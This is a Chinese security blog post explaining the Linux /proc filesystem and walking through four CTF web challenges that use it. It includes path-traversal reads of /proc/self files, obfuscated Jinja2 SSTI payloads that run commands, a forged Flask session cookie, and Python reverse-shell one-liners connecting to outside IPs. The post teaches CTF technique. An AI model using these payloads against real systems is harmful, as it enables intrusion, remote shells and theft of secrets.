> 原文链接: https://www.anquanke.com//post/id/241148 


# Proc 目录在 CTF 中的利用


                                阅读量   
                                **76337**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p4.ssl.qhimg.com/t01e1bf43ec69ad72dc.png)](https://p4.ssl.qhimg.com/t01e1bf43ec69ad72dc.png)



## 前言

在 CTF 中经常会用到 `/proc` 这个目录来进行绕过，利用它里面的一些子目录或文件读取网站源码或者环境信息等，甚至直接读取flag或者直接Getshell。下面我们就简单总结一下 `/proc` 目录是什么以及他的作用。



## /proc 目录

Linux系统上的/proc目录是一种文件系统，即proc文件系统。与其它常见的文件系统不同的是，/proc 是一种伪文件系统（也即虚拟文件系统），存储的是当前内核运行状态的一系列特殊文件，用户可以通过这些文件查看有关系统硬件及当前正在运行进程的信息，甚至可以通过更改其中某些文件来改变内核的运行状态。

简单来讲，`/proc` 目录即保存在系统内存中的信息，大多数虚拟文件可以使用文件查看命令如cat、more或者less进行查看，有些文件信息表述的内容可以一目了然，但也有文件的信息却不怎么具有可读性。

/proc 目录中包含许多以数字命名的子目录，这些数字表示系统当前正在运行进程的进程号(PID)，里面包含对应进程相关的多个信息文件：

```
ls -al /proc
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01e35dc989d9d1471a.png)

下面我们简单介绍一下 `/proc` 目录中的常见文件夹与文件。

上面列出的是 /proc 目录中一些进程相关的目录，每个目录中是其进程本身相关信息的文件。下面是系统上运行的一个PID为1090的进程的相关文件，其中有些文件是每个进程都会具有的：

```
ls -al /proc/1090
```

[![](https://p2.ssl.qhimg.com/t0123890bc9bccc1b77.png)](https://p2.ssl.qhimg.com/t0123890bc9bccc1b77.png)

这里简单讲几个与题目相关的进程文件：

### <a class="reference-link" name="cmdline"></a>cmdline

cmdline 文件存储着启动当前进程的完整命令，但僵尸进程目录中的此文件不包含任何信息。可以通过查看cmdline目录获取启动指定进程的完整命令：

```
cat /proc/2889/cmdline
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01fd811fafe29c6f2e.png)

可知PID为2889的进程的启动命令为/usr/bin/docker-proxy。

### <a class="reference-link" name="cwd"></a>cwd

cwd 文件是一个指向当前进程运行目录的符号链接。可以通过查看cwd文件获取目标指定进程环境的运行目录：

```
ls -al /proc/1090/cwd
```

[![](https://p0.ssl.qhimg.com/t01d40908911dc7957e.png)](https://p0.ssl.qhimg.com/t01d40908911dc7957e.png)

可见PID为1090的进程的运行目录为/var/lib/postgresql/9.5/main，然后我们可以直接使用ls目录查看该进行运行目录下的文件：

```
ls /proc/1090/cwd
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01c2d2bb0f51026ca7.png)

如上图所示，与直接查看/var/lib/postgresql/9.5/main目录的效果是一样的。

### <a class="reference-link" name="exe"></a>exe

exe 是一个指向启动当前进程的可执行文件（完整路径）的符号链接。通过exe文件我们可以获得指定进程的可执行文件的完整路径：

```
ls -al /proc/1090/exe
```

[![](https://p3.ssl.qhimg.com/t017a37252f6ea76515.png)](https://p3.ssl.qhimg.com/t017a37252f6ea76515.png)

### <a class="reference-link" name="environ"></a>environ

environ 文件存储着当前进程的环境变量列表，彼此间用空字符（NULL）隔开。变量用大写字母表示，其值用小写字母表示。可以通过查看environ目录来获取指定进程的环境变量信息：

```
cat /proc/2889/environ
```

[![](https://p3.ssl.qhimg.com/t013738d48a1068fe8c.png)](https://p3.ssl.qhimg.com/t013738d48a1068fe8c.png)

常用来读取环境变量中的SECRET_KEY或FLAG。

### <a class="reference-link" name="fd"></a>fd

fd 是一个目录，里面包含这当前进程打开的每一个文件的文件描述符（file descriptor），这些文件描述符是指向实际文件的一个符号链接，即每个通过这个进程打开的文件都会显示在这里。所以我们可以通过fd目录里的文件获得指定进程打开的每个文件的路径以及文件内容。

查看指定进程打开的某个文件的路径：

```
ls -al /proc/1070/fd
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01791de0a03094d52b.png)

查看指定进程打开的某个文件的内容：

```
ls -al /proc/1070/fd/4
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t0157aa66f7b86d8789.png)

**这个fd比较重要，因为在 linux 系统中，如果一个程序用open()打开了一个文件但最终没有关闭他，即便从外部（如os.remove(SECRET_FILE)）删除这个文件之后，在 /proc 这个进程的 pid 目录下的 fd 文件描述符目录下还是会有这个文件的文件描述符，通过这个文件描述符我们即可得到被删除文件的内容。**

### <a class="reference-link" name="self"></a>self

上面这些操作列出的都是目标环境指定进程的信息，但是我们在做题的时候往往需要的当前进程的信息，这时候就用到了 `/proc` 目录中的 self 子目录。

`/proc/self` 表示当前进程目录。前面说了通过 `/proc/$pid/` 来获取指定进程的信息。如果某个进程想要获取当前进程的系统信息，就可以通过进程的pid来访问/proc/$pid/目录。但是这个方法还需要获取进程pid，在fork、daemon等情况下pid还可能发生变化。为了更方便的获取本进程的信息，linux提供了 `/proc/self/` 目录，这个目录比较独特，不同的进程访问该目录时获得的信息是不同的，内容等价于 `/proc/本进程pid/` 。进程可以通过访问 `/proc/self/` 目录来获取自己的系统信息，而不用每次都获取pid。

有了self目录就方便多了，下面我们演示一下self的常见使用。
- 获取当前启动进程的完整命令：
```
cat /proc/self/cmdline
```

[![](https://p3.ssl.qhimg.com/t015e69042a05f22651.png)](https://p3.ssl.qhimg.com/t015e69042a05f22651.png)
- 获取目标当前进程环境的运行目录与目录里的文件：
```
ls -al /proc/self/cwd
ls /proc/self/cwd
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01d14f188e1030625a.png)

当不知道目标网站的Web路径或当前路径时，这经常使用
- 获得当前进程的可执行文件的完整路径：
```
ls -al /proc/self/exe
```

[![](https://p3.ssl.qhimg.com/t01b06885a7901b0314.png)](https://p3.ssl.qhimg.com/t01b06885a7901b0314.png)
- 获取当前进程的环境变量信息：
```
cat /proc/self/environ
```

[![](https://p0.ssl.qhimg.com/t01af119a6af900d613.png)](https://p0.ssl.qhimg.com/t01af119a6af900d613.png)
- 获取当前进程打开的文件内容：
```
cat /proc/self/fd/`{`id`}`
```

下文在题目中演示。

**注意：**在真正做题的时候，我们是不能通过命令的方式执行通过cat命令读取cmdline的，因为如果是cat读取/proc/self/cmdline的话，得到的是cat进程的信息，所以我们要通过题目的当前进程使用读取文件（如文件包含漏洞，或者SSTI使用file模块读取文件）的方式读取/proc/self/cmdline。



## [网鼎杯 2020 白虎组]PicDown

进入题目，一个输入框：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t011ccd5dc2607b4aa0.png)

看到url中有个/?url=，本以为是ssrf，但试了试不行，考虑文件包含，我们抓包尝试：

[![](https://p4.ssl.qhimg.com/t01048e02d8194aa9ae.png)](https://p4.ssl.qhimg.com/t01048e02d8194aa9ae.png)

发现确实存在文件包含漏洞。首先尝试直接构造 `?url=../../../../../../../flag` 来读取flag失败，看来有过滤。

我们要换一种思路，既然存在文件包含，我们不仅可以直接读取文件，也可以通过读取/proc目录中的文件来读取文件。如下，我们读取/proc/self/cmdline来获取启动当前题目进程的完整命令：

```
?url=../../../../../../../proc/self/cmdline
```

[![](https://p3.ssl.qhimg.com/t01086d014eed71a6c4.png)](https://p3.ssl.qhimg.com/t01086d014eed71a6c4.png)

可知，由python2启动了一个app.py文件，我们读一下这个app.py文件：

[![](https://p1.ssl.qhimg.com/t01be079d8140928810.png)](https://p1.ssl.qhimg.com/t01be079d8140928810.png)

得到页面的源码：

```
from flask import Flask, Response
from flask import render_template
from flask import request
import os
import urllib

app = Flask(__name__)

SECRET_FILE = "/tmp/secret.txt" 
f = open(SECRET_FILE)       # 用open()打开/tmp/secret.txt文件，文件描述符为f
SECRET_KEY = f.read().strip()      # 读取secret.txt文件，并将内容赋给SECRET_KEY
os.remove(SECRET_FILE)


@app.route('/')
def index():
    return render_template('search.html')     # 访问/根目录是渲染search.html


@app.route('/page')
def page():
    url = request.args.get("url")
    try:
        if not url.lower().startswith("file"):
            res = urllib.urlopen(url)       # 创建一个表示远程url的类文件对象,然后像本地文件一样操作这个类文件对象来获取远程数据。
            value = res.read()
            response = Response(value, mimetype='application/octet-stream')
            response.headers['Content-Disposition'] = 'attachment; filename=beautiful.jpg'
            return response
        else:
            value = "HACK ERROR!"    
    except:
        value = "SOMETHING WRONG!"search.html
    return render_template('search.html', res=value)    # 将value(url获取的内容)渲染到search.html页面


@app.route('/no_one_know_the_manager')
def manager():
    key = request.args.get("key")
    print(SECRET_KEY)
    if key == SECRET_KEY:
        shell = request.args.get("shell")
        os.system(shell)          # 这里如果key=SECRET_KEY，那么就从URL中获取shell参数并用system函数(无回显)执行。
        res = "ok"
    else:
        res = "Wrong Key!"

    return res


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
```

可以知道，漏洞代码如下：

```
@app.route('/no_one_know_the_manager')
def manager():
    key = request.args.get("key")
    print(SECRET_KEY)
    if key == SECRET_KEY:
        shell = request.args.get("shell")
        os.system(shell)          # 这里如果key=SECRET_KEY，那么就从URL中获取shell参数并用system函数(无回显)执行。
        res = "ok"
    else:
        res = "Wrong Key!"

    return res
```

首先接受一个 `key` 值，如果 `key` 和 `SECRET_KEY` 相等，然后接受一个 `shell` 值，并用system()函数执行，注意，system函数执行是无回显的，所以我们要反弹shell。

首先尝试读取这个`/tmp/secret.txt`文件，发现不能读取成功：

[![](https://p0.ssl.qhimg.com/t01fb6c7e6062148609.png)](https://p0.ssl.qhimg.com/t01fb6c7e6062148609.png)

那我们怎么办呢，我们发现，`/tmp/secret.txt` 文件使用open()函数打开的，如下：

```
SECRET_FILE = "/tmp/secret.txt" 
f = open(SECRET_FILE)       # 用open()打开/tmp/secret.txt文件，文件描述符为f
SECRET_KEY = f.read().strip()      # 读取secret.txt文件，，并将内容赋给SECRET_KEY
os.remove(SECRET_FILE)     # 删除/tmp/secret.txt文件
```

程序读取完SECRET_KEY会删除 `/tmp/secret.txt` 文件，**但在 linux 系统中如果一个程序用open()打开了一个文件但最终没有关闭他，即便从外部（如os.remove(SECRET_FILE)）删除这个文件之后，在 /proc 这个进程的 pid 目录下的 fd 文件描述符目录下还是会有这个文件的文件描述符，通过这个文件描述符我们即可得到被删除文件的内容**。/proc/[pid]/fd 这个目录里包含了进程打开文件的情况，目录里面有一堆/proc/[pid]/fd/id文件，id就是进程记录的打开文件的文件描述符的序号。我们通过对id的爆破，得到`/tmp/secret.txt`文件描述符的序号：

[![](https://p0.ssl.qhimg.com/t01b789245ddcab1445.png)](https://p0.ssl.qhimg.com/t01b789245ddcab1445.png)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t010e37efc159ce68b3.png)

[![](https://p3.ssl.qhimg.com/t016a45d8935af7783c.png)](https://p3.ssl.qhimg.com/t016a45d8935af7783c.png)

如上图所示，在id等于3的时候读取成功了，得到secret.txt的内容为：`JLAwm2xCtqkgNGJTHgPPocxTSLbWX4q7FVxQDxFCi/w=` 。这时我们就可以通过python来反弹shell了，即构造如下：

```
/no_one_know_the_manager?key=JLAwm2xCtqkgNGJTHgPPocxTSLbWX4q7FVxQDxFCi/w=&amp;shell=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("47.xxx.xxx.72",2333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
```

攻击者vps上面监听2333端口：

[![](https://p2.ssl.qhimg.com/t01573492d47935ae16.png)](https://p2.ssl.qhimg.com/t01573492d47935ae16.png)

执行后，反弹shell成功，flag在 `/root/flag.txt` 里面。



## [V&amp;N2020 公开赛]CHECKIN

该题与这个题思路一样，都是python反弹shell

[![](https://p3.ssl.qhimg.com/t01618f9eba58458b24.png)](https://p3.ssl.qhimg.com/t01618f9eba58458b24.png)

当开始用open()打开了flag.txt文件，但是并没有将文件关闭，如上图close加了注释。我们简单反弹shell：

```
http://f2b62f37-fcc3-498b-9319-cadbe70f2479.node3.buuoj.cn/shell?c=python3%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%22174.2.168.0%22,7000));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call([%22/bin/bash%22,%22-i%22]);%27
```

由于是buuctf上的题目，其环境都是内网，所以我们如果要反弹shell的话要开个内网靶机、IP为174.2.168.0，端口7000。

得到shell后，我们要对/proc/[pid]/fd/[id]进行遍历，由于有很多[pid]我们可以直接用来`*`代替，省的一步一步去找，我们可以用`cat /proc/*/fd/*`：

[![](https://p1.ssl.qhimg.com/t017927a11071bc9133.png)](https://p1.ssl.qhimg.com/t017927a11071bc9133.png)

得到flag。



## [pasecactf_2019]flask_ssti

题目给了提示，一段代码：

```
def encode(line, key, key2):
    return ''.join(chr(x ^ ord(line[x]) ^ ord(key[::-1][x]) ^ ord(key2[x])) for x in range(len(line)))

app.config['flag'] = encode('', 'GQIS5EmzfZA1Ci8NslaoMxPXqrvFB7hYOkbg9y20W34', 'xwdFqMck1vA0pl7B8WO3DrGLma4sZ2Y6ouCPEHSQVT5')
```

进入题目，是一个输入框，输入你的名字然后输出：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01ecfda5f491e7c331.png)

经测试存在SSTI漏洞：

[![](https://p1.ssl.qhimg.com/t01924d8c5b4b77738b.png)](https://p1.ssl.qhimg.com/t01924d8c5b4b77738b.png)

经测试，过滤了一下字符。

话不多少，直接使用Unicode编码绕过，给出payload：

```
`{``{`()["\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f"]["\u005f\u005f\u0062\u0061\u0073\u0065\u0073\u005f\u005f"][0]["\u005f\u005f\u0073\u0075\u0062\u0063\u006c\u0061\u0073\u0073\u0065\u0073\u005f\u005f"]()[80]["\u006c\u006f\u0061\u0064\u005f\u006d\u006f\u0064\u0075\u006c\u0065"]("os")["popen"]("ls /")|attr("read")()`}``}`
# 用&lt;class '_frozen_importlib.BuiltinImporter'&gt;这个去执行命令

"""
`{``{`()["__class__"]["__bases__"][0]["__subclasses__"]()[80]["load_module"]("os")["system"]("ls")`}``}`
# 用&lt;class '_frozen_importlib.BuiltinImporter'&gt;这个去执行命令
"""
```

命令执行成功：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01e7dd570dfbf3c748.png)

通过读取/proc目录中的文件查看当前进程：

```
`{``{`()["\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f"]["\u005f\u005f\u0062\u0061\u0073\u0065\u0073\u005f\u005f"][0]["\u005f\u005f\u0073\u0075\u0062\u0063\u006c\u0061\u0073\u0073\u0065\u0073\u005f\u005f"]()[91]["\u0067\u0065\u0074\u005f\u0064\u0061\u0074\u0061"](0, "app.py")`}``}`

"""
`{``{`()["__class__"]["__bases__"][0]["__subclasses__"]()[91]["get_data"](0, "app.py")`}``}`
# 用&lt;class '_frozen_importlib_external.FileLoader'&gt;这个去读取文件
"""
```

**注意：**这里就不能使用之前那个命令执行通过cat命令读取cmdline了，因为如果是cat读取/proc/self/cmdline的话，得到的是cat进程的信息，所以我们要通过题目的当前进程使用python读取文件的方式读取/proc/self/cmdline。（不知道你们听懂了没……）

[![](https://p3.ssl.qhimg.com/t014fad9c39826b95ab.png)](https://p3.ssl.qhimg.com/t014fad9c39826b95ab.png)

如上图所示，得到当前进程为app.py。

读取app.py文件：

[![](https://p2.ssl.qhimg.com/t01723062bd0e569e7c.png)](https://p2.ssl.qhimg.com/t01723062bd0e569e7c.png)

得到了如下源码：

```
import random
from flask import Flask, render_template_string, render_template, request
import os

app = Flask(__name__)
app.config['SECRET_KEY'] = 'folow @osminogka.ann on instagram =)'

#Tiaonmmn don't remember to remove this part on deploy so nobody will solve that hehe
'''
def encode(line, key, key2):
    return ''.join(chr(x ^ ord(line[x]) ^ ord(key[::-1][x]) ^ ord(key2[x])) for x in range(len(line)))
app.config['flag'] = encode('', 'GQIS5EmzfZA1Ci8NslaoMxPXqrvFB7hYOkbg9y20W3', 'xwdFqMck1vA0pl7B8WO3DrGLma4sZ2Y6ouCPEHSQVT')
'''

def encode(line, key, key2):
    return ''.join(chr(x ^ ord(line[x]) ^ ord(key[::-1][x]) ^ ord(key2[x])) for x in range(len(line)))

file = open("/app/flag", "r")
flag = file.read()

app.config['flag'] = encode(flag, 'GQIS5EmzfZA1Ci8NslaoMxPXqrvFB7hYOkbg9y20W3', 'xwdFqMck1vA0pl7B8WO3DrGLma4sZ2Y6ouCPEHSQVT')
flag = ""

os.remove("/app/flag")

nicknames = ['˜”*°★☆★_%s_★☆★°°*', '%s ~♡ⓛⓞⓥⓔ♡~', '%s Вêчңø в øĤлâйĤé', '♪ ♪ ♪ %s ♪ ♪ ♪ ', '[♥♥♥%s♥♥♥]', '%s, kOтO®Aя )(оТеЛ@ ©4@$tьЯ', '♔%s♔', '[♂+♂=♥]%s[♂+♂=♥]']

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        try:
            p = request.values.get('nickname')
            id = random.randint(0, len(nicknames) - 1)
            if p != None:
                if '.' in p or '_' in p or '\'' in p:
                    return 'Your nickname contains restricted characters!'
                return render_template_string(nicknames[id] % p)

        except Exception as e:
            print(e)
            return 'Exception'

    return render_template('index.html')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=1337)
```

经过阅读源码我们，app.py会打开/app/flag文件，然后读取其中的内容进行加密，加密函数在提示中给出的源码中。最后会删掉flag。话不多少，直接读取/proc/self/fd/3，得到Flag：

```
`{``{`()["\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f"]["\u005f\u005f\u0062\u0061\u0073\u0065\u0073\u005f\u005f"][0]["\u005f\u005f\u0073\u0075\u0062\u0063\u006c\u0061\u0073\u0073\u0065\u0073\u005f\u005f"]()[91]["\u0067\u0065\u0074\u005f\u0064\u0061\u0074\u0061"](0, "/proc/self/fd/3")`}``}`
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01361216102591094b.png)



## [PASECA2019]honey_shop

进入题目，是一个商店：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01eb7e5d3439affc65.png)

可以购买flag：

[![](https://p4.ssl.qhimg.com/t01c8a3fe5acc55f1c5.png)](https://p4.ssl.qhimg.com/t01c8a3fe5acc55f1c5.png)

但是我们钱不够，这种题一般就是修改cookie。查看cookie，尝试flask session解密，如下图成功解密：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01d72dee1ebaeef176.png)

那么我们的思路就是将session中代表金钱的balance该多点就行了。但是既然要修改flask session，我们肯定还需要获取secret key。

我们发现，当点击主页的图片时，会自动下载文件：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t0116eb46b954fa1530.png)

抓包测试：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01f66f0692e6d4b4d9.png)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t015c1c740d0d924e9a.png)

可见存在任意文件读取漏洞，那我们可以通过这里读取 `/proc/self/environ`，查看当前进程Python的环境变量：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01e8b0fea0cfdd847c.png)

成功获取到了SECRET_KEY=dc8FZ1M5r1Hc6W4k1Z8zDPHcIkcVh7zEimk5YAuW，然后我们就可以伪造flask session了：

```
python3 flask_session_cookie_manager3.py encode -s "dc8FZ1M5r1Hc6W4k1Z8zDPHcIkcVh7zEimk5YAuW" -t "`{`'balance': 4000, 'purchases': []`}`"
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t0196640cd28d742d02.png)

然后使用伪造的session替换原来的session我们就有钱买flag了。

<a class="reference-link" name="Ending%E2%80%A6%E2%80%A6"></a>**Ending……**
